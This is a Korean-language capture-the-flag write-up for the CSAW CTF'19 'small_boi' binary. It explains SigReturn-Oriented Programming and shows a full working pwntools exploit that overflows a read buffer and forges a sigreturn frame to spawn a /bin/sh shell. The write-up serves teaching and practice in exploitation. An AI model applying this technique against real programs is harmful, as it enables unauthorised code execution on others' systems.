# [WriteUp]CSAW CTF'19 Quals - small_boi

:black_nib:chykor12(sjjo0225@gmail.com)

---

SigReturn-Oriented Programming(SROP)을 사용하는 문제이다.

---

```bash
chykor12@ubuntu:~/CSAW CTF$ file small_boi
small_boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=070f96f86ab197c06c4a6896c26254cce3d57650, stripped
```

small_boi는 정적 링킹된 프로그램이다. `objdump`와 `strings`를 사용해서 프로그램을 보면, 막말로 있는 게 없다.

```bash
chykor12@ubuntu:~/CSAW CTF$ objdump -d small_boi

small_boi:     file format elf64-x86-64


Disassembly of section .text:

000000000040017c <.text>:
  40017c:	55                   	push   %rbp
  40017d:	48 89 e5             	mov    %rsp,%rbp
  400180:	b8 0f 00 00 00       	mov    $0xf,%eax
  400185:	0f 05                	syscall 
  400187:	90                   	nop
  400188:	5d                   	pop    %rbp
  400189:	c3                   	retq   
  40018a:	58                   	pop    %rax
  40018b:	c3                   	retq   
  40018c:	55                   	push   %rbp
  40018d:	48 89 e5             	mov    %rsp,%rbp
  400190:	48 8d 45 e0          	lea    -0x20(%rbp),%rax 
  400194:	48 89 c6             	mov    %rax,%rsi
  400197:	48 31 c0             	xor    %rax,%rax
  40019a:	48 31 ff             	xor    %rdi,%rdi
  40019d:	48 c7 c2 00 02 00 00 	mov    $0x200,%rdx
  4001a4:	0f 05                	syscall 
  4001a6:	b8 00 00 00 00       	mov    $0x0,%eax
  4001ab:	5d                   	pop    %rbp
  4001ac:	c3                   	retq   
  4001ad:	55                   	push   %rbp
  4001ae:	48 89 e5             	mov    %rsp,%rbp
  4001b1:	b8 00 00 00 00       	mov    $0x0,%eax
  4001b6:	e8 d1 ff ff ff       	callq  0x40018c
  4001bb:	48 31 f8             	xor    %rdi,%rax
  4001be:	48 c7 c0 3c 00 00 00 	mov    $0x3c,%rax
  4001c5:	0f 05                	syscall 
  4001c7:	90                   	nop
  4001c8:	5d                   	pop    %rbp
  4001c9:	c3                   	retq
```

```bash
chykor12@ubuntu:~/CSAW CTF$ strings -t x small_boi
    17a vPUH
    1ca /bin/sh
   1010 GCC: (Ubuntu 7.3.0-27ubuntu1~18.04) 7.3.0
   103b .shstrtab
   1045 .note.gnu.build-id
   1058 .text
   105e .rodata
   1066 .eh_frame_hdr
   1074 .eh_frame
   107e .data
   1084 .comment
```

대신 `"/bin/sh"`가 바이너리에 있다. 프로그램을 실행시켜 보면 `read` 시스템 콜로 `0x200`만큼 입력을 받고, `exit` 시스템 콜로 종료된다. `read` 시스템 콜에서 BOF를 발생시킬 수 있고, `syscall` 가젯이 있는 것으로 보아 레지스터를 적절히 조작하고 `execve` 시스템 콜을 실행하면 쉘을 획득할 수 있을 것 같은데, 레지스터를 조작하기에는 가젯이 많이 부족할 것 같다.

---

## Concept of SigReturn-Oriented Programming(SROP, x64)

SROP는 레지스터의 값을 임의로 변경할 수 있는 `sigreturn` 시스템 콜을 이용한 익스플로잇 기법이다. `sigreturn` 시스템 함수는 Signal을 처리하는 프로세스가 Kernel Mode에서 User Mode로 돌아올 때 스택을 복원하기 위해 사용되는 함수이다.

```c
asmlinkage long sys_rt_sigreturn(void){
    struct pt_regs *regs = current_pt_regs();
    struct rt_sigframe __user *frame;
...
    if (restore_sigcontext(regs, &frame->uc.uc_mcontext, uc_flags))
        goto badframe;
...
}
```

`restore_sigcontext()` 함수는 `COPY_SEG()`, `COPY()` 함수 등을 이용하여 스택에 저장된 값을 각 레지스터에 복사한다. 즉, 값을 레지스터에 저장할 수 있는 가젯이 없어도 `sigreturn()` 함수를 이용해 각 레지스터에 원하는 값을 저장할 수 있다는 것이다.

---

`rax`를 `0xf`로 맞춰주고 `syscall`을 호출하면 `sigreturn()` 함수로 레지스터의 값을 조작할 수 있다. `rax`를 `execve()`의 시스템 콜 넘버인 `0x3b`로, `rdi`를 `"/bin/sh"`의 주소로, `rip`를 `syscall`의 주소로 맞춰 주면 바로 쉘을 획득할 수 있을 것이다.(sigreturn frame을 설정할 때 레지스터의 값을 특정하지 않으면 0으로 설정된다.)

```bash
gdb-peda$ find /bin/sh
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
small_boi : 0x4001ca --> 0x68732f6e69622f ('/bin/sh')
```

```bash
gdb-peda$ ropsearch "pop rax"
Searching for ROP gadget: 'pop rax' in: binary ranges
0x0040018a : (b'58c3')	pop rax; ret
```

```bash
gdb-peda$ ropsearch syscall
Searching for ROP gadget: 'syscall' in: binary ranges
0x00400185 : (b'0f05905dc3')	syscall; nop; pop rbp; ret
0x004001c5 : (b'0f05905dc3')	syscall; nop; pop rbp; ret
0x004001a4 : (b'0f05b8000000005dc3')	syscall; mov eax,0x0; pop rbp; ret
```

sigreturn frame은 다음과 같이 설정할 수 있다.

```python
syscall = 0x400185 # address of "syscall" gadget
binsh = 0x4001ca # address of "/bin/sh"

frame = SigreturnFrame(arch = 'amd64')
frame.rax = 0x3b
frame.rdi = binsh
frame.rip = syscall
```

---

최종 익스플로잇은 다음과 같다.

```python
# exploit_small_boi.py

from pwn import *

addr_binsh = 0x4001ca # address of "/bin/sh"
pop_rax = 0x40018a # address of "pop rax; ret" gadget
syscall = 0x400185 # address of "syscall" gadget
binsh = 0x4001ca # address of "/bin/sh"

payload = "A" * 0x28
payload += p64(pop_rax)
payload += p64(0xf) # Sigreturn syscall number
payload += p64(syscall)

frame = SigreturnFrame(arch = 'amd64')
frame.rax = 0x3b
frame.rdi = binsh
frame.rip = syscall

payload += str(frame)

r = process("./small_boi")
# r = remote("pwn.chal.csaw.io", 1002)

r.send(payload)

r.interactive()

```

```bash
chykor12@ubuntu:~/CSAW CTF$ python exploit_small_boi.py
[+] Starting local process './small_boi': pid 2614
[*] Switching to interactive mode
$ whoami
chykor12

```

